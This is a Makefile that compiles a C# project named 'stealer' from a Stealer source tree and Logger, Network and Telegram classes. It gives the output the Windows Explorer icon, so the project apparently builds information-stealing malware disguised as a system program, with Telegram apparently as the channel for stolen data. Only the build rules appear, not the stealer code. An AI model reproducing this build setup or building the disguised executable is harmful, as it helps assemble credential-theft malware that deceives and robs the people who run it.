SRC=src
BIN=bin
ICONS=icons

ICON=explorer

CSC=csc
CSCFLAGS=-optimize /target:exe

SOURCES=Config classes\Logger classes\Network classes\Telegram asinfo\AssemblyInfo
RECURSE=Stealer

TARGET=stealer

all: dir
	$(CSC) $(CSCFLAGS) /out:$(BIN)/$(TARGET).exe /win32icon:$(ICONS)/$(ICON).ico -recurse:$(foreach var,$(RECURSE),$(addprefix $(SRC)\, $(addsuffix .cs, $(var)))) $(foreach var,$(SOURCES),$(addprefix $(SRC)\, $(addsuffix .cs, $(var))))

clean:
	del $(BIN)\*.exe $(BIN)\*.txt
	rmdir $(BIN)

dir:
	-mkdir $(BIN)